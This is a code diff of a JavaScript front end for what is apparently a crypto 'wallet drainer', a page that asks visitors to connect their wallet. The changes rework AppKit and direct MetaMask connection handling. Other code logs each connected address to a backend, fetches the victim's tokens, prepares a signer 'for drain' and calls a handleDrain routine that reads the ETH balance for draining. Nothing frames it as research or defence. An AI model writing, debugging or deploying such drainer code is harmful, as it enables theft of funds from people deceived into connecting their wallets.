@@ -136,31 +136,10 @@ async function initializeAppKit() {
         });
         
         console.log("✅ AppKit created successfully");
+        console.log("AppKit instance:", appKit);
         
-        // CRITICAL FIX: Subscribe to state changes with better detection
-        const unsubscribe = appKit.subscribeState((state) => {
-            console.log("🔍 AppKit State Update - Full:", state);
-            console.log("isConnected:", state.isConnected);
-            console.log("account:", state.account);
-            console.log("chain:", state.chain);
-            console.log("connector:", state.connector);
-            
-            // Check for connection
-            if (state.isConnected && state.account && state.chain) {
-                console.log("✅ CONNECTION DETECTED IN STATE!");
-                if (!isConnected || currentAccount !== state.account.address) {
-                    console.log("🔄 Processing new connection...");
-                    handleConnected(state.account, state.chain);
-                }
-            } 
-            // Check for disconnection
-            else if (state.isConnected === false) {
-                console.log("❌ DISCONNECTION DETECTED IN STATE");
-                if (isConnected) {
-                    handleDisconnected();
-                }
-            }
-        });
+        // Subscribe to state changes
+        appKit.subscribeState(handleAppKitState);
         
     } catch (error) {
         console.error("❌ AppKit initialization error:", error);
@@ -188,10 +167,6 @@ function setupEventListeners() {
     
     // Connect button
     if (connectBtn) {
-        // Remove any existing listeners
-        connectBtn.replaceWith(connectBtn.cloneNode(true));
-        connectBtn = document.getElementById("connectBtn");
-        
         connectBtn.addEventListener("click", handleConnect);
         console.log("✅ Connect button listener added");
     }
@@ -216,102 +191,81 @@ function setupEmergencyFallback() {
     console.log('🔄 Setting up emergency fallback...');
     
     if (connectBtn) {
-        connectBtn.addEventListener('click', handleEmergencyConnect);
+        // Direct MetaMask fallback
+        connectBtn.addEventListener('click', async () => {
+            updateStatus('🔄 Trying direct connection...');
+            
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    
+                    if (accounts && accounts.length > 0) {
+                        currentAccount = accounts[0];
+                        isConnected = true;
+                        updateStatus(`✅ Connected directly!\nWallet: ${currentAccount.slice(0, 8)}...`);
+                        showUIElements();
+                        await logConnectionToBackend(currentAccount, 1);
+                        await fetchTokens(currentAccount, 1);
+                    }
+                } catch (err) {
+                    console.error('Direct connection failed:', err);
+                    updateStatus('Connection failed. Please try again.');
+                }
+            } else {
+                updateStatus('Please install MetaMask or another wallet');
+            }
+        });
+        
         updateStatus('⚠️ Using fallback mode. Click to connect directly.');
     }
 }
 
-async function handleEmergencyConnect() {
-    updateStatus('🔄 Trying direct connection...');
+function handleAppKitState(state) {
+    console.log("🔄 AppKit State Update:", state);
     
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-            });
-            
-            if (accounts && accounts.length > 0) {
-                currentAccount = accounts[0];
-                currentChainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
-                isConnected = true;
-                
-                connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
-                updateStatus(`✅ Connected directly!\nWallet: ${currentAccount.slice(0, 8)}...\nChain: ${CONFIG.networkNames[currentChainId] || `Chain ${currentChainId}`}`);
-                
-                showUIElements();
-                await logConnectionToBackend(currentAccount, currentChainId);
-                await fetchTokens(currentAccount, currentChainId);
-                
-                // Setup provider and signer for drain
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                
-                // Update disconnect handler
-                connectBtn.onclick = async () => {
-                    isConnected = false;
-                    currentAccount = null;
-                    currentChainId = null;
-                    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
-                    updateStatus('Disconnected');
-                    hideUIElements();
-                    connectBtn.onclick = handleEmergencyConnect;
-                };
-            }
-        } catch (err) {
-            console.error('Direct connection failed:', err);
-            updateStatus(`Connection failed: ${err.message}`);
-        }
-    } else {
-        updateStatus('Please install MetaMask or another wallet');
+    if (state.isConnected && state.account && state.chain) {
+        console.log("✅ Connected state detected");
+        handleConnected(state.account, state.chain);
+    } else if (state.isConnected === false && isConnected) {
+        console.log("❌ Disconnected state detected");
+        handleDisconnected();
     }
 }
 
 async function handleConnect(event) {
     console.log("🔄 Connect button clicked!");
-    console.log("Current connection state:", isConnected);
     
     try {
         if (!appKit) {
             updateStatus("❌ Wallet connection not initialized");
             console.error("AppKit not initialized");
-            await initializeAppKit();
             return;
         }
         
-        // Check if already connected via AppKit
-        const currentState = appKit.state;
-        console.log("Current AppKit state before action:", currentState);
+        // Check current state safely
+        let currentState;
+        try {
+            currentState = appKit.state || {};
+        } catch (e) {
+            currentState = {};
+            console.log("⚠️ Could not access appKit.state:", e.message);
+        }
         
-        if (currentState.isConnected && currentState.account) {
-            console.log("Already connected via AppKit, disconnecting...");
+        if (isConnected) {
+            // Disconnect
             updateStatus("🔄 Disconnecting...");
             await appKit.disconnect();
             return;
         }
         
         updateStatus("🔄 Opening wallet modal...");
-        console.log("Opening modal for wallet selection...");
+        console.log("Calling appKit.open()...");
         
-        // Open the wallet modal - FIXED: Use proper open method
-        await appKit.open({
-            view: 'connect'
-        });
-        
-        console.log("✅ Modal opened - waiting for wallet selection...");
-        
-        // Set a timeout to check connection status
-        setTimeout(() => {
-            if (!isConnected) {
-                console.log("⚠️ Still not connected after modal opened");
-                console.log("Current AppKit state:", appKit.state);
-                
-                // Force check the state
-                if (appKit.state.isConnected && appKit.state.account) {
-                    console.log("✅ Found connection on delayed check!");
-                    handleConnected(appKit.state.account, appKit.state.chain);
-                }
-            }
-        }, 3000);
+        // Open the wallet modal - SIMPLE call
+        await appKit.open();
+        console.log("✅ Modal opened successfully");
         
     } catch (error) {
         console.error("❌ Connection error:", error);
@@ -328,106 +282,67 @@ function tryAlternativeConnect() {
     console.log("🔄 Trying alternative connection method...");
     updateStatus("🔄 Trying alternative connection...");
     
-    window.ethereum.request({ method: 'eth_requestAccounts' })
-        .then(accounts => {
-            if (accounts && accounts.length > 0) {
-                currentAccount = accounts[0];
-                currentChainId = parseInt(window.ethereum.chainId, 16);
-                isConnected = true;
-                updateStatus(`✅ Connected via fallback\nWallet: ${currentAccount.slice(0, 8)}...`);
-                showUIElements();
-                logConnectionToBackend(currentAccount, currentChainId);
-                fetchTokens(currentAccount, currentChainId);
-            }
-        })
-        .catch(err => {
-            console.error("Fallback connection failed:", err);
-            updateStatus("Please install MetaMask or another wallet");
-        });
+    // Try using window.ethereum directly
+    if (typeof window.ethereum !== 'undefined') {
+        window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                if (accounts && accounts.length > 0) {
+                    currentAccount = accounts[0];
+                    isConnected = true;
+                    updateStatus(`✅ Connected via fallback\nWallet: ${currentAccount.slice(0, 8)}...`);
+                    showUIElements();
+                    logConnectionToBackend(currentAccount, 1);
+                    fetchTokens(currentAccount, 1);
+                }
+            })
+            .catch(err => {
+                console.error("Fallback connection failed:", err);
+                updateStatus("Please install MetaMask or another wallet");
+            });
+    } else {
+        updateStatus("Please install a wallet extension like MetaMask");
+    }
 }
 
 async function handleConnected(account, chain) {
     try {
-        console.log("🔄 Handling connection in handleConnected...");
-        console.log("Account data:", account);
-        console.log("Chain data:", chain);
+        console.log("🔄 Handling connection...");
+        console.log("Account:", account);
+        console.log("Chain:", chain);
         
-        // Extract account address (handles both object and string)
-        let accountAddress;
-        if (typeof account === 'string') {
-            accountAddress = account;
-        } else if (account && account.address) {
-            accountAddress = account.address;
-        } else {
-            console.error("Invalid account data:", account);
+        if (!account?.address || !chain?.id) {
+            console.log("Waiting for account/chain data...");
+            setTimeout(() => handleConnected(account, chain), 100);
             return;
         }
         
-        // Extract chain ID
-        let chainId;
-        if (typeof chain === 'number') {
-            chainId = chain;
-        } else if (chain && chain.id) {
-            chainId = chain.id;
-        } else if (chain && chain.chainId) {
-            chainId = chain.chainId;
-        } else {
-            console.error("Invalid chain data:", chain);
-            return;
-        }
-        
-        currentAccount = accountAddress;
-        currentChainId = chainId;
+        currentAccount = account.address;
+        currentChainId = chain.id;
         isConnected = true;
         
         // Update UI
         if (connectBtn) {
             connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
-            // Update click handler for disconnect
-            connectBtn.onclick = async () => {
-                if (appKit) {
-                    await appKit.disconnect();
-                } else {
-                    handleDisconnected();
-                }
-            };
         }
         
-        const chainName = (chain && chain.name) || CONFIG.networkNames[chainId] || `Chain ${chainId}`;
-        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chainName}\n⛓️ Chain ID: ${chainId}`);
+        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
         
         // Show UI elements
         showUIElements();
         
         // Log connection to backend
-        await logConnectionToBackend(currentAccount, chainId);
+        await logConnectionToBackend(currentAccount, chain.id);
         
         // Fetch tokens
-        await fetchTokens(currentAccount, chainId);
+        await fetchTokens(currentAccount, chain.id);
         
         // Update network selector
         if (chainSelector && networkSelect) {
             chainSelector.classList.remove("hidden");
-            networkSelect.value = chainId;
+            networkSelect.value = chain.id;
         }
         
-        // Setup provider and signer for drain functionality
-        if (typeof window.ethereum !== 'undefined') {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
-            console.log("✅ Provider and signer setup for drain");
-        } else if (appKit && appKit.signer) {
-            // Try to get signer from AppKit
-            try {
-                provider = new ethers.providers.Web3Provider(appKit.signer);
-                signer = provider.getSigner();
-                console.log("✅ Provider and signer setup from AppKit");
-            } catch (error) {
-                console.log("⚠️ Could not setup signer from AppKit:", error);
-            }
-        }
-        
-        console.log("✅ Fully connected and ready for drain");
+        console.log("✅ Fully connected and ready");
         
     } catch (error) {
         console.error("❌ Connected handler error:", error);
@@ -446,7 +361,6 @@ function handleDisconnected() {
     
     if (connectBtn) {
         connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
-        connectBtn.onclick = handleConnect;
     }
     
     updateStatus("Disconnected");
@@ -610,17 +524,15 @@ async function handleDrain() {
             drainBtn.textContent = "⏳ Draining...";
         }
         
-        // Get signer from wallet - try multiple sources
-        if (!signer) {
-            if (typeof window.ethereum !== 'undefined') {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-            } else if (appKit && appKit.signer) {
-                provider = new ethers.providers.Web3Provider(appKit.signer);
-                signer = provider.getSigner();
-            } else {
-                throw new Error("No wallet provider found");
-            }
+        // Get signer from wallet using AppKit's signer
+        if (appKit && appKit.signer) {
+            provider = new ethers.providers.Web3Provider(appKit.signer);
+            signer = provider.getSigner();
+        } else if (typeof window.ethereum !== 'undefined') {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+        } else {
+            throw new Error("No wallet provider found");
         }
         
         // Get ETH balance
